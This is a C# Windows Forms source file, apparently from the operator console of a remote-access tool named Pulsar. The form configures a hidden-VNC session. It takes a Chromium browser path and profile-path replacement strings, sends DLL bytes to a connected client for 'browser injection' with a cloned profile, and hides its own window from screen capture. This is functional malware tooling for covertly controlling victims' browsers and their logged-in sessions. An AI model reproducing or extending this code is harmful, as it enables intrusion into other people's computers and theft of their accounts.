using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Networking;
using System;
using System.IO;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmHVNCPopUp : Form
    {
        private readonly Client _client;
        private readonly byte[] _dllBytes;

        public FrmHVNCPopUp(Client client, byte[] dllBytes)
        {
            _client = client;
            _dllBytes = dllBytes;

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                openFileDialog.Title = "Select Browser Executable";
                openFileDialog.CheckFileExists = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtBrowserPath.Text = openFileDialog.FileName;
                }
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtBrowserPath.Text))
            {
                MessageBox.Show("Please specify a browser executable path.", "Validation Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (string.IsNullOrWhiteSpace(txtSearchPattern.Text))
            {
                MessageBox.Show("Please specify a search pattern.", "Validation Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (string.IsNullOrWhiteSpace(txtReplacementPath.Text))
            {
                MessageBox.Show("Please specify a replacement path.", "Validation Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            _client.Send(new StartHVNCProcess
            {
                Path = "GenericChromium",
                DontCloneProfile = false,
                DllBytes = _dllBytes,
                CustomBrowserPath = txtBrowserPath.Text.Trim(),
                CustomSearchPattern = txtSearchPattern.Text.Trim(),
                CustomReplacementPath = txtReplacementPath.Text.Trim()
            });

            MessageBox.Show(
                $"Generic Chromium browser injection started.\n\n" +
                $"Browser: {Path.GetFileName(txtBrowserPath.Text)}\n" +
                $"Search: {txtSearchPattern.Text}\n" +
                $"Replace: {txtReplacementPath.Text}",
                "Browser Started",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information
            );

            this.Close();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void FrmHVNCPopUp_Load(object sender, EventArgs e)
        {
            toolTip1.SetToolTip(txtBrowserPath, "Full path to the browser executable (e.g., C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe)");
            toolTip1.SetToolTip(txtSearchPattern, "String pattern to search for in browser paths (e.g., Local\\Vivaldi\\User Data)");
            toolTip1.SetToolTip(txtReplacementPath, "String to replace the search pattern with (e.g., Local\\Vivaldi\\KDOT)");
        }
    }
}
